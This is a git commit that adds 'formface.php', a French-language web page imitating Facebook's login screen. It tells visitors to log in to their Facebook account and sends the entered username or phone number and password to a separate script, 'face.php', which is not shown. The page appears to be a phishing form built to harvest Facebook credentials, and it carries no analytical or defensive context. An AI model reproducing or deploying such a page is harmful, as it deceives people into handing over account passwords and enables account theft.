b5795dfec6ef0d4f655d482cd98365c7c6839544
alphanlack <136650397+alphanlack@users.noreply.github.com>
2023-06-14 23:40:53 +0200

    Add files via upload

---
+++ formface.php
@@ -0,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>connexion facebook</title>
+    <link rel="stylesheet" href="face.css">
+    <div class="h"><p>veillez dabors vous connectez a votre compte facebook</p></div>
+</head>
+<body>
+<form action="face.php" method="post">
+  <h1>facebook</h1>
+    <div class="container">
+    <form>
+      <h2>Connexion</h2>
+      <input type="text"  id="nom" name= "nom" required   placeholder="nom d'utilisateur ou numero de telephone"><br>
+
+      <input type="text" id="password" name= "password" required placeholder="Mot de passe" >
+      <br>
+      <button type="submit">se connecter</button>
+<br><br>
+      <a href="#">Mot de passe oublié ?</a>
+      <hr>
+      <br>
+      <div class="cr">
+        <div class="text">
+              <p>crée nouveaux compte</p>
+        </div>
+        
+      </div>
+    </form>
+  </div>
+</body>
+</html>
